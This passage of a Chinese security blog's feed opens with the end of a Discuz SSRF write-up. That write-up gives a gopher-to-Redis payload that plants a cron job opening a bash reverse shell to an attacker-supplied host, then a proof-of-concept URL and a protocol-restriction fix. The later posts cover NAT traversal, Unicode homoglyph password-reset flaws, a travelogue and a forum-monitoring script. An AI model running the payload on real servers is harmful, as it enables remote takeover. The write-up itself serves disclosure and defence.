header(<span class="string">"Location: gopher://127.0.0.1:6379/_*1<span class="variable">%0d</span><span class="variable">%0a</span><span class="variable">$8</span><span class="variable">%0d</span><span class="variable">%0aflushall</span><span class="variable">%0d</span><span class="variable">%0a</span>*3<span class="variable">%0d</span><span class="variable">%0a</span><span class="variable">$3</span><span class="variable">%0d</span><span class="variable">%0aset</span><span class="variable">%0d</span><span class="variable">%0a</span><span class="variable">$1</span><span class="variable">%0d</span><span class="variable">%0a1</span><span class="variable">%0d</span><span class="variable">%0a</span><span class="variable">$6</span>4<span class="variable">%0d</span><span class="variable">%0a</span><span class="variable">%0d</span><span class="variable">%0a</span><span class="variable">%0a</span><span class="variable">%0a</span>*/1<span class="variable">%20</span>*<span class="variable">%20</span>*<span class="variable">%20</span>*<span class="variable">%20</span>*<span class="variable">%20bash</span><span class="variable">%20</span>-i<span class="variable">%20</span>&gt;&amp;<span class="variable">%20</span>/dev/tcp/{your_server}/{your_server_listen_port}<span class="variable">%200</span>&gt;&amp;1<span class="variable">%0a</span><span class="variable">%0a</span><span class="variable">%0a</span><span class="variable">%0a</span><span class="variable">%0a</span><span class="variable">%0d</span><span class="variable">%0a</span><span class="variable">%0d</span><span class="variable">%0a</span><span class="variable">%0d</span><span class="variable">%0a</span>*4<span class="variable">%0d</span><span class="variable">%0a</span><span class="variable">$6</span><span class="variable">%0d</span><span class="variable">%0aconfig</span><span class="variable">%0d</span><span class="variable">%0a</span><span class="variable">$3</span><span class="variable">%0d</span><span class="variable">%0aset</span><span class="variable">%0d</span><span class="variable">%0a</span><span class="variable">$3</span><span class="variable">%0d</span><span class="variable">%0adir</span><span class="variable">%0d</span><span class="variable">%0a</span><span class="variable">$1</span>6<span class="variable">%0d</span><span class="variable">%0a</span>/var/spool/cron/<span class="variable">%0d</span><span class="variable">%0a</span>*4<span class="variable">%0d</span><span class="variable">%0a</span><span class="variable">$6</span><span class="variable">%0d</span><span class="variable">%0aconfig</span><span class="variable">%0d</span><span class="variable">%0a</span><span class="variable">$3</span><span class="variable">%0d</span><span class="variable">%0aset</span><span class="variable">%0d</span><span class="variable">%0a</span><span class="variable">$1</span>0<span class="variable">%0d</span><span class="variable">%0adbfilename</span><span class="variable">%0d</span><span class="variable">%0a</span><span class="variable">$4</span><span class="variable">%0d</span><span class="variable">%0aroot</span><span class="variable">%0d</span><span class="variable">%0a</span>*1<span class="variable">%0d</span><span class="variable">%0a</span><span class="variable">$4</span><span class="variable">%0d</span><span class="variable">%0asave</span><span class="variable">%0d</span><span class="variable">%0aquit</span><span class="variable">%0d</span><span class="variable">%0a</span>"</span>)
?&gt;
</code></pre><p>poc:</p>
<pre><code>forum.php?mod=ajax&amp;action=downremoteimg&amp;message=[img=1,1]<span class="link_url">http://127.0.0.1:8054/test/301.php?1.jpg</span>[<span class="link_label">/img</span>]&amp;inajax=1&amp;fid=2&amp;wysiwyg=1&amp;formhash=ead1f9a6&amp;posttime=1476777238&amp;wysiwyg=1&amp;subject=test&amp;unused%5B%5D=1
</code></pre><p>服务器本地监听6379端口，可以看到gopher协议成功请求。</p>
<p><img src="/images/discuzssrf4.png" alt=""></p>
<h2 id="补丁分析">补丁分析</h2><p>目前discuz没有修复这个问题。不过经过测试，discuz官方论坛是关闭了这个功能的。</p>
<h2 id="修复方案">修复方案</h2><p>1，建议直接关闭远程下载图片这个功能。<br>2，在_dfsockopen方法内增加</p>
<pre><code>curl_setopt(<span class="variable">$ch</span>, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); 
</code></pre><p>将协议限制为http/https可以降低这个SSRF的危害。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;参考资料&quot;&gt;参考资料&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;http://wufeifei.com/ssrf/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;SSRF到GET SHELL&lt;/a&gt;&lt;br&gt;wooyun:wooyun-2015-015117
    
    </summary>
    
      <category term="代码审计" scheme="http://xdxd.love/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
  </entry>
  
  <entry>
    <title>对称NAT穿透的一种新方法</title>
    <link href="http://xdxd.love/2016/10/18/%E5%AF%B9%E7%A7%B0NAT%E7%A9%BF%E9%80%8F%E7%9A%84%E4%B8%80%E7%A7%8D%E6%96%B0%E6%96%B9%E6%B3%95/"/>
    <id>http://xdxd.love/2016/10/18/对称NAT穿透的一种新方法/</id>
    <published>2016-10-18T01:57:26.000Z</published>
    <updated>2016-10-18T03:15:00.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言">前言</h2><p>这种方法从安全的角度来说是利用了目前路由器实现对称NAT的方法中存在端口可以预测的漏洞，利用这个漏洞来实现打洞。加上一次发送大量的包，来增加命中的概率。</p>
<h2 id="参考资料">参考资料</h2><p>整理翻译自<a href="https://www.goto.info.waseda.ac.jp/~wei/file/wei-apan-v10.pdf" target="_blank" rel="external">A New Method for Symmetric NAT Traversal in UDP and TCP</a><br><a href="http://www.cnblogs.com/my_life/articles/1908552.html" target="_blank" rel="external">NAT的四种类型及类型检测</a></p>
<h2 id="关键字">关键字</h2><p>NAT穿透，对称NAT，UDP,P2P，状态包预测，TCP，P2P打洞</p>
<h2 id="4中NAT类型">4中NAT类型</h2><p>用语定义</p>
<p>1.内部Tuple：指内部主机的私有地址和端口号所构成的二元组，即内部主机所发送报文的源地址、端口所构成的二元组<br>2.外部Tuple：指内部Tuple经过NAT的源地址/端口转换之后，所获得的外部地址、端口所构成的二元组，即外部主机收到经NAT转换之后的报文时，它所看到的该报文的源地址（通常是NAT设备的地址）和源端口<br>3.目标Tuple：指外部主机的地址、端口所构成的二元组，即内部主机所发送报文的目标地址、端口所构成的二元组</p>
<p>详细释义</p>
<ol>
<li>Full Cone NAT：所有来自同一 个内部Tuple X的请求均被NAT转换至同一个外部Tuple Y，而不管这些请求是不是属于同一个应用或者是多个应用的。除此之外，当X-Y的转换关系建立之后，任意外部主机均可随时将Y中的地址和端口作为目标地址 和目标端口，向内部主机发送UDP报文，由于对外部请求的来源无任何限制，因此这种方式虽然足够简单，但却不那么安全.</li>
</ol>
<p><img src="/images/nat1.png" alt=""></p>
<ol>
<li>Restricted Cone NAT： 它是Full Cone的受限版本：所有来自同一个内部Tuple X的请求均被NAT转换至同一个外部Tuple Y，这与Full Cone相同，但不同的是，只有当内部主机曾经发送过报文给外部主机（假设其IP地址为Z）后，外部主机才能以Y中的信息作为目标地址和目标端口，向内部 主机发送UDP请求报文，这意味着，NAT设备只向内转发（目标地址/端口转换）那些来自于当前已知的外部主机的UDP报文，从而保障了外部请求来源的安 全性</li>
</ol>
<p><img src="/images/nat2.png" alt=""></p>
<ol>
<li>Port Restricted Cone NAT：它是Restricted Cone NAT的进一步受限版。只有当内部主机曾经发送过报文给外部主机（假设其IP地址为Z且端口为P）之后，外部主机才能以Y中的信息作为目标地址和目标端 口，向内部主机发送UDP报文，同时，其请求报文的源端口必须为P，这一要求进一步强化了对外部报文请求来源的限制，从而较Restrictd Cone更具安全性</li>
</ol>
<p><img src="/images/nat3.png" alt=""></p>
<ol>
<li>Symmetric NAT：这是一种比所有Cone NAT都要更为灵活的转换方式：在Cone NAT中，内部主机的内部Tuple与外部Tuple的转换映射关系是独立于内部主机所发出的UDP报文中的目标地址及端口的，即与目标Tuple无关； 在Symmetric NAT中，目标Tuple则成为了NAT设备建立转换关系的一个重要考量：只有来自于同一个内部Tuple 、且针对同一目标Tuple的请求才被NAT转换至同一个外部Tuple，否则的话，NAT将为之分配一个新的外部Tuple；打个比方，当内部主机以相 同的内部Tuple对2个不同的目标Tuple发送UDP报文时，此时NAT将会为内部主机分配两个不同的外部Tuple，并且建立起两个不同的内、外部 Tuple转换关系。与此同时，只有接收到了内部主机所发送的数据包的外部主机才能向内部主机返回UDP报文，这里对外部返回报文来源的限制是与Port Restricted Cone一致的。不难看出，如果说Full Cone是要求最宽松NAT UDP转换方式，那么，Symmetric NAT则是要求最严格的NAT方式，其不仅体现在转换关系的建立上，而且还体现在对外部报文来源的限制方面。</li>
</ol>
<p><img src="/images/nat4.png" alt=""></p>
<h2 id="已经存在的穿透方案">已经存在的穿透方案</h2><p>UPNP，STUN，Teredo等都无法支持对称NAT(第4类NAT)穿透。</p>
<h2 id="新方法">新方法</h2><p>新方法的UDP打洞基于端口预测和限制TTL的值。也适用于其他的NAT类型。<br>新方法一共有3个阶段。</p>
<p><img src="/images/nat5.png" alt=""></p>
<h3 id="第一阶段">第一阶段</h3><p>假设两个通讯的终端分别为echo client和echo server。</p>
<p>F1：echo client跟S1通讯，然后S1获得其经过NAT a的端口号。<br>F2：S1返回获得的端口号给echo client<br>F3：echo client给S2发一个包。包括上次S1返回的nat之后的端口号。S2记录下相关的NAT端口信息。<br><img src="/images/nat6.png" alt=""></p>
<h3 id="第二阶段">第二阶段</h3><p>第二阶段是echo server跟S1和S2通信。流程跟echo client类似。</p>
<p><img src="/images/nat7.png" alt=""></p>
<h3 id="第三阶段">第三阶段</h3><p>经过之前的通讯，服务器可以获得echo client和echo server两次nat的端口号。比如echo client第一次nat端口为5361，第二次nat端口为5362，那么有理由猜测，第三次的端口为5363.经过测试发现端口的变化多是有一定的规律，递增，递减，跳跃等。</p>
<p>F7: 基于前面两个阶段的通信，可以预测打洞的端口和打洞的模式。发送给echo server.<br>F8: 基于预测的端口，echo server发送大量的包。这些包包括一个固定的目的端口和低的TTL值。<br>F9: 同理，服务器将预测的端口发给echo client，跟F7类似。<br>F10: 基于预测的端口，echo client发送大量固定端口的数据包到预测的端口。之后，echo client 转换到接受模式。</p>
<p>如果预测的端口刚好被大量的包都命中。那么就可以建立通信。</p>
<p><img src="/images/nat8.png" alt=""></p>
<h2 id="新方法的优势">新方法的优势</h2><h2 id="结论">结论</h2><p><img src="/images/nat9.png" alt=""></p>
<p>这种方法从安全的角度来说是利用了目前路由器实现对称NAT的方法中存在端口可以预测的漏洞，利用这个漏洞来实现打洞。加上一次发送大量的包，来增加命中的概率。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;前言&lt;/h2&gt;&lt;p&gt;这种方法从安全的角度来说是利用了目前路由器实现对称NAT的方法中存在端口可以预测的漏洞，利用这个漏洞来实现打洞。加上一次发送大量的包，来增加命中的概率。&lt;/p&gt;
&lt;h2 id=&quot;参考资料&quot;&gt;参考资料&lt;/h2&gt;&lt;p&gt;整理翻译自&lt;a hre
    
    </summary>
    
      <category term="万物互联" scheme="http://xdxd.love/categories/%E4%B8%87%E7%89%A9%E4%BA%92%E8%81%94/"/>
    
    
  </entry>
  
  <entry>
    <title>unicode同形字引起的安全问题</title>
    <link href="http://xdxd.love/2016/10/17/unicode%E5%90%8C%E5%BD%A2%E5%AD%97%E5%BC%95%E8%B5%B7%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/"/>
    <id>http://xdxd.love/2016/10/17/unicode同形字引起的安全问题/</id>
    <published>2016-10-17T00:25:08.000Z</published>
    <updated>2016-10-19T05:42:32.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="历史上的安全漏洞">历史上的安全漏洞</h1><h2 id="spotify的漏洞">spotify的漏洞</h2><p><a href="https://labs.spotify.com/2013/06/18/creative-usernames/" target="_blank" rel="external">spotify任意用户密码修改漏洞</a><br>漏洞简介:<br>找一个需要黑掉的账号，比如以bigbird为例。创建一个账户名为 ᴮᴵᴳᴮᴵᴿᴰ (in python this is the string u’\u1d2e\u1d35\u1d33\u1d2e\u1d35\u1d3f\u1d30′)。然后申请修改忘记密码，修改自己申请的账号密码。修改之后以刚刚设置的密码登录bigbird。就可以成功登录。<br>spotify的漏洞相比于github的漏洞来说是一个真正的高危漏洞，可以修改任意用户的密码。</p>
<h2 id="github的漏洞">github的漏洞</h2><p>相关资料：</p>
<p><a href="https://twitter.com/GitHubSecurity/status/757686530748125184" target="_blank" rel="external">https://twitter.com/GitHubSecurity/status/757686530748125184</a><br><a href="https://bounty.github.com/researchers/jagracey.html?ljh" target="_blank" rel="external">https://bounty.github.com/researchers/jagracey.html?ljh</a></p>
<p>漏洞简介：<br>github的邮箱名允许unicode字符，导致可以把找回密码的token发送到攻击者的邮箱。假设有 mike@example.org vs mıke@example.org 两个邮箱。重置mıke@example.org用户的密码。github在处理邮箱名字的时候，会把mıke@example.org标准化成mike@example.org，从而把mike@example.org用户的密码重置token发送到了mıke@example.org的邮箱。</p>
<p>从twitter的讨论来以及自己的测试结果来看提供邮箱服务的产品大部分都是白名单了邮箱的用户名，所以都是不可以使用unicode字符的。测试了网易的企业邮箱和腾讯的企业邮箱，都不可以使用unicode字符。所以只能自己搭一个邮件服务器来测试这个问题。</p>
<h1 id="魔法在哪里">魔法在哪里</h1><h2 id="编码的基础知识、unicode编码和同形字">编码的基础知识、unicode编码和同形字</h2><p>参考资料：<br><a href="http://www.freebuf.com/articles/web/25623.html" target="_blank" rel="external">http://www.freebuf.com/articles/web/25623.html</a><br><a href="http://www.irongeek.com/homoglyph-attack-generator.php" target="_blank" rel="external">http://www.irongeek.com/homoglyph-attack-generator.php</a></p>
<p>了解了编码是二进制和字符之间的映射关系之后，可以了解到unicode字符无非也是一种字符而已，只要程序支持，应该不会有任何问题。为什么这个unicode字符在处理过程中变成了另外一个字符，而且是看起来很相似的字符，难道程序也跟人眼看一样，被相同的外表迷惑了。显然程序处理的是二进制的数据，只要二进制不同，无论外表看起来多么一样，程序都应该可以分辨出来。关于unicode同形字的问题，unicode homoglyphs，其实早就有不少讨论。不过大多是利用同形字来迷惑人钓鱼之类。那么机器怎么也会被同形字迷惑呢。</p>
<p>github的漏洞描述中是这么写的:a flaw in the way email addresses were being normalized to standard character sets when used to look up accounts during the password recovery flow. 在邮件地址标准化成标准的字符集的时候出现问题。</p>
<p>而spoity中对有对详细漏洞的代码分析：可以看到也是对字符串的标准化操作导致unicode字符转换成了与他同形的ascii字符。</p>
<h2 id="unicode转ascii">unicode转ascii</h2><p>参考资料：<br><a href="https://www.peterbe.com/plog/unicode-to-ascii" target="_blank" rel="external">https://www.peterbe.com/plog/unicode-to-ascii</a><br><a href="http://savanttools.com/unicode-to-ascii.asp" target="_blank" rel="external">http://savanttools.com/unicode-to-ascii.asp</a></p>
<p>这里才是最有意思的地方，为什么对unicode字符的标准化会导致unicode转变成了对应的同形字。电脑应该是只看二进制，又不是跟人一样，会被同形的字迷惑。通过搜索发现，原来有专门的unicode转ascii函数，对unicode于同形的ascii之间有对应的map。</p>
<p>比如github中提到的例子，转成对应的ascii就刚好对的上。<br><img src="/images/unicodesec1.png" alt="image"></p>
<h1 id="漏洞原理">漏洞原理</h1><p>漏洞的原理比较有意思，主要的条件是用户的id支持unicode。比如两个ID：mike@example.org vs mıke@example.org<br>然而在一些业务逻辑中会对用户id做标准化的操作，比如重置密码的时候，mıke@example.org标准化之后变成了mike@example.org，从而重置了mike@example.org的密码。</p>
<p>所以关键的条件就是用户识别的ID(包括可以用来登录的邮箱)支持unicode。而在某些业务逻辑中有对unicode字符进行所谓标准化，转换成了对应的ascii。其实假如某些业务逻辑不支持unicode，直接丢掉了那部分unicode，应该也是一样的，目前没有看到类似的案例。导致在这部分业务逻辑中出现了越权的问题。典型的场景就是修改密码，导致可以修改他人的密码。</p>
<h1 id="对微信的测试记录">对微信的测试记录</h1><p>实际中的场景比较少，大部分产品都会对用户登录名做白名单限制了。经过一番寻找发现微信的绑定邮箱是支持unicode的，而且是邮箱的用户名和域名部分都支持unicode。当然最后的测试结果是不存在这个漏洞。作为一个典型的测试过程记录一下。</p>
<h2 id="搭建支持unicode用户名的邮件服务器">搭建支持unicode用户名的邮件服务器</h2><p>使用iredmail方便快速搭建邮件服务器。然后发现iredmail对用户名也是有过滤的。代码在iRedAdmin-0.6.1/libs/iredutils.py 中的is_email方法。修改该方法直接返回True,不检查邮件用户名。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">######################&#10;# Regular expressions.&#10;#&#10;# Email.&#10;reEmail = r&#39;&#39;&#39;[\w\-][\w\-\.\+\=]*@[\w\-][\w\-\.]*\.[a-zA-Z0-9\-]&#123;2,15&#125;&#39;&#39;&#39;&#10;&#10;# Domain.&#10;reDomain = r&#39;&#39;&#39;[\w\-][\w\-\.]*\.[a-z0-9\-]&#123;2,15&#125;&#39;&#39;&#39;&#10;&#10;# End Regular expressions.&#10;####&#10;&#10;#####################################&#10;# Pre-defined values of SQL functions.&#10;sqlUnixTimestamp = web.sqlliteral(&#39;UNIX_TIMESTAMP()&#39;)&#10;&#10;#####&#10;&#10;##############&#10;# Validators&#10;#&#10;INVALID_EMAIL_CHARS = &#39;~!#$%^&#38;*()\\/\ &#39;&#10;INVALID_DOMAIN_CHARS = &#39;~!#$%^&#38;*()+\\/\ &#39;&#10;&#10;&#10;def is_email(s):&#10;    #return True &#30452;&#25509;&#36820;&#22238;true&#65292;&#19981;&#26816;&#26597;email&#21517;&#31216;&#21512;&#27861;&#24615;&#12290;&#10;    s = str(s)&#10;    if len(set(s) &#38; set(INVALID_EMAIL_CHARS)) &#62; 0 \&#10;       or &#39;.&#39; not in s \&#10;       or s.count(&#39;@&#39;) != 1:&#10;        return False&#10;&#10;    reCompEmail = re.compile(reEmail + &#39;$&#39;, re.IGNORECASE)&#10;    if reCompEmail.match(s):&#10;        return True&#10;    else:&#10;        return False</span><br></pre></td></tr></table></figure>
<p><img src="/images/unicodesec2.png" alt="image"></p>
<p>然后发现依然无法收到邮件，发现服务器返回505。拒绝了含有unicode字符的邮箱。</p>
<p><img src="/images/unicodesec3.png" alt="image"></p>
<p>采用的解决方式在数据库中插入了一条域名的邮箱，转发到一个正常的邮箱。这样可以接受这个域名所有的邮件。</p>
<p><img src="/images/unicode4.png" alt="image"></p>
<p>因为iredmail默认开启了SSL，为了调试，查看具体的smtp信息，关闭了SSL，直接明文传。</p>
<h2 id="绑定邮箱以及重置密码">绑定邮箱以及重置密码</h2><p>微信邮箱绑定支持unicode字符的邮箱。<br><img src="/images/unicodesec5.png" alt="image"></p>
<p>绑定邮箱后，重置密码。</p>
<p><img src="/images/unicodesec6.png" alt="image"> </p>
<p>正常重置了自己的密码。链接中的email字段是base64编码的。解码出来是含有unicode字符的邮箱。所以微信的重置密码业务逻辑中没有标准化unicode字符这个处理。不存在unicode同形字引起的漏洞。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;历史上的安全漏洞&quot;&gt;历史上的安全漏洞&lt;/h1&gt;&lt;h2 id=&quot;spotify的漏洞&quot;&gt;spotify的漏洞&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://labs.spotify.com/2013/06/18/creative-usernames/&quot; targe
    
    </summary>
    
      <category term="渗透测试" scheme="http://xdxd.love/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
  </entry>
  
  <entry>
    <title>台湾游记</title>
    <link href="http://xdxd.love/2016/10/09/%E5%8F%B0%E6%B9%BE%E6%B8%B8%E8%AE%B0/"/>
    <id>http://xdxd.love/2016/10/09/台湾游记/</id>
    <published>2016-10-09T07:23:23.000Z</published>
    <updated>2016-10-11T01:24:31.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="吐槽">吐槽</h2><p><a href="http://bbs.qyer.com/forum-52-0-1-1.html?#gotonav" target="_blank" rel="external">穷游网台湾精华帖</a>，感觉穷游上的游记更应该像是攻略。这样的游记可以给后来者很多参考，提供很多有用的信息，穷游貌似也主动引导用户这么写。但是完全按照攻略的旅行岂不是成了另外一种形式的跟团游。几年以前放弃跟团，开始自助旅行。这次的经历发现各种攻略越来越成熟，但是攻略的内容只能依赖一半吧。完全按照攻略的旅行，也没有太多新意。</p>
<h2 id="最佳体验">最佳体验</h2><p>从台东到花莲的绿皮小火车不错。已经没几个人坐了。我们坐的时候整个火车不超过10个人，所以我们自己占了一节车厢。车厢与车厢之间还是露天的。窗户可以打开。一路上很多隧道，很有恐怖电影的感觉。尤其是在隧道前面停车的时候，车刚启动，还没有电，进入隧道就是全黑的。吓死宝宝了。当然，坐这个车是为了看沿途的海景，只要天气好才能看到美丽的海景。</p>
<p>在垦丁骑个电瓶车，到处晃悠着去看海的感觉也不错。就是天气太好，晒了半天就掉了一层皮。白沙湾可以看到亮瞎眼睛的星星，非常多的星星。</p>
<p>台湾的鸡排很好吃。自由广场修的不错。故宫空调有点冷。除了美丽的环境，在中正纪念堂也可以感受到从另一个角度看的历史。所以，什么才是真相。</p>
<h2 id="如果有下次">如果有下次</h2><p>单个地点的深度游也许可以更好。走马观花只能拍拍照，像当地人一样去生活才能感受到更多。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;吐槽&quot;&gt;吐槽&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;http://bbs.qyer.com/forum-52-0-1-1.html?#gotonav&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;穷游网台湾精华帖&lt;/a&gt;，感觉穷游上的游记更应该像是攻略
    
    </summary>
    
      <category term="人生苦短" scheme="http://xdxd.love/categories/%E4%BA%BA%E7%94%9F%E8%8B%A6%E7%9F%AD/"/>
    
    
  </entry>
  
  <entry>
    <title>小脚本之监控论坛帖子更新并发送邮件通知</title>
    <link href="http://xdxd.love/2016/09/26/%E5%B0%8F%E8%84%9A%E6%9C%AC%E4%B9%8B%E7%9B%91%E6%8E%A7%E8%AE%BA%E5%9D%9B%E5%B8%96%E5%AD%90%E6%9B%B4%E6%96%B0%E5%B9%B6%E5%8F%91%E9%80%81%E9%82%AE%E4%BB%B6%E9%80%9A%E7%9F%A5/"/>
    <id>http://xdxd.love/2016/09/26/小脚本之监控论坛帖子更新并发送邮件通知/</id>
    <published>2016-09-26T06:19:44.000Z</published>
    <updated>2016-11-14T02:25:05.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="需求">需求</h2><p>想要监控某个论坛是否有更新帖。如果有帖子更新并且标题符合某种条件就发送邮件通知</p>
<a id="more"></a>
<h2 id="实现">实现</h2><p>用python来实现比较简单，不到100行代码。用requests进行http请求，BeautifulSoup进行html解析。为了加快请求响应速度，设置useragent为手机的useragent，这样子就可以返回手机页面。</p>
<p>编写一个函数获取第一条帖子的标题。这里的例子为discuz论坛。</p>
<pre><code><span class="function"><span class="keyword">def</span> <span class="title">getnewesttitle</span><span class="params">()</span>:</span>
    url = <span class="string">'http://www.test.net/forum.php?mod=forumdisplay&amp;fid=33&amp;filter=author&amp;orderby=dateline'</span>
    headers = {<span class="string">'user-agent'</span>: <span class="string">'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.76 Mobile Safari/537.36'</span>}
    r = requests.get(url, headers=headers)
    soup = BeautifulSoup(r.text)
    newest = soup.find(<span class="string">'span'</span>,class_=<span class="string">'by'</span>)
    <span class="keyword">return</span> newest.parent.text
</code></pre><p>主要逻辑为运行时先获取第一条帖子的标题，并保存。然后不断循环获取第一条帖子的标题，如果跟之前保存的不一样，就认为有帖子更新。</p>
<pre><code>newesttitle = <span class="function"><span class="title">getnewesttitle</span><span class="params">()</span></span>
while True:
    try:
        thenexttitle = <span class="function"><span class="title">getnewesttitle</span><span class="params">()</span></span>
        <span class="function"><span class="title">print</span><span class="params">(<span class="string">'monitoring'</span>)</span></span>
        print newesttitle.<span class="function"><span class="title">encode</span><span class="params">(<span class="string">'utf-8'</span>)</span></span>
        print thenexttitle.<span class="function"><span class="title">encode</span><span class="params">(<span class="string">'utf-8'</span>)</span></span>
        <span class="keyword">if</span> thenexttitle != newesttitle:
            newesttitle = thenexttitle
            <span class="function"><span class="title">send_mail</span><span class="params">(smtp_user, smtp_pass, thenexttitle.strip()</span></span>, thenexttitle.<span class="function"><span class="title">strip</span><span class="params">()</span></span>)
        <span class="keyword">else</span>:
            pass
    except RuntimeError:
        <span class="function"><span class="title">print</span><span class="params">(RuntimeError)</span></span>
    <span class="tag">time</span>.<span class="function"><span class="title">sleep</span><span class="params">(<span class="number">1</span>)</span></span>
</code></pre><p>发送邮件采用QQ邮箱，用sender模块。</p>
<pre><code><span class="function"><span class="keyword">def</span> <span class="title">send_mail</span><span class="params">(smtp_user, smtp_pass, subject=<span class="string">'test'</span>, body=<span class="string">'test'</span>, sendto=sendto, smtp_server=<span class="string">'smtp.qq.com'</span>,
              smtp_port=<span class="number">465</span>)</span>:</span>
    mail = Mail(smtp_server, port=smtp_port, username=smtp_user, password=smtp_pass, use_tls=<span class="keyword">False</span>, use_ssl=<span class="keyword">True</span>,
                debug_level=<span class="keyword">None</span>)
    mail.send_message(subject, fromaddr=smtp_user, to=sendto, body=body)
</code></pre><h2 id="Supervisord">Supervisord</h2><p>使用Supervisord做进程管理，如果程序挂掉，可以自动重启。</p>
<p>supervisord配置为：</p>
<pre><code><span class="title">[program:gettahua]</span>
<span class="setting">command=<span class="value">python get.py</span></span>
<span class="comment">;numprocs=1                 ; 默认为1</span>
<span class="comment">;process_name=%(program_name)s   ; 默认为 %(program_name)s，即 [program:x] 中的 x</span>
<span class="setting">directory=<span class="value">/root/ ; 执行 command 之前，先切换到工作目录</span></span>
<span class="setting">user=<span class="value">root            ; 使用 oxygen 用户来启动该进程</span></span>
<span class="comment">; 程序崩溃时自动重启，重启次数是有限制的，默认为3次</span>
<span class="setting">autorestart=<span class="value"><span class="keyword">true</span></span></span>
<span class="setting">startretries=<span class="value"><span class="number">9999999999</span></span></span>
<span class="setting">redirect_stderr=<span class="value"><span class="keyword">true</span>        ; 重定向输出的日志</span></span>
<span class="setting">stdout_logfile = <span class="value">/var/log/test.log</span></span>
<span class="setting">loglevel=<span class="value">info</span></span>
</code></pre><p>然后就可以安心干活，不用盯着论坛刷帖了~~</p>
<h2 id="参考资料">参考资料</h2><p><a href="http://www.cnblogs.com/restran/p/4854623.html" target="_blank" rel="external">Python 进程管理工具 Supervisor 使用教程</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;需求&quot;&gt;需求&lt;/h2&gt;&lt;p&gt;想要监控某个论坛是否有更新帖。如果有帖子更新并且标题符合某种条件就发送邮件通知&lt;/p&gt;
    
    </summary>
    
      <category term="折腾不止" scheme="http://xdxd.love/categories/%E6%8A%98%E8%85%BE%E4%B8%8D%E6%AD%A2/"/>
    
    
      <category term="python" scheme="http://xdxd.love/tags/python/"/>
    
  </entry>
  
</feed>
